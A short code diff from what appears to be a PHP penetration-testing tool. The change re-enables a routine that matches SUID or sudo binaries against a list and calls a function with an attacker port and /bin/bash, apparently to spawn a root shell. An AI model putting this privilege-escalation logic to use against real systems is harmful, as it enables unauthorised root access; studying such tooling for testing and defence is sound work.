@@ -903,9 +903,9 @@ This can be used to help determine the OS running and the last time it's been fu
         $data = "ls -al $filepath";
         $this->req_str($stream,$data,$this->stream_timeout,"");
         
-        $obj_suid = new bin4linux($filepath);
+        $obj_suid = new bin4linux($stream,$filepath);
            
-        /*
+        
             if (in_array($obj_suid->file_name, $this->tab_sudo8app2shell) ) {
                 $cmd_id = "%ID%";
                 $id = $obj_suid->elf4root2cmd($this->ip,$attacker_port,"/bin/bash",$sudo,$userpass, $cmd_id);
@@ -913,7 +913,7 @@ This can be used to help determine the OS running and the last time it's been fu
                 $template_id_test = str_replace("%ID%", $id, $this->template_id);                
                 $this->pentest8id($stream,$template_id_test);$this->pause();
             }
-            
+            /*
             if (in_array($obj_suid->file_name, $this->tab_sudo8app2write) ) {
                 
                 
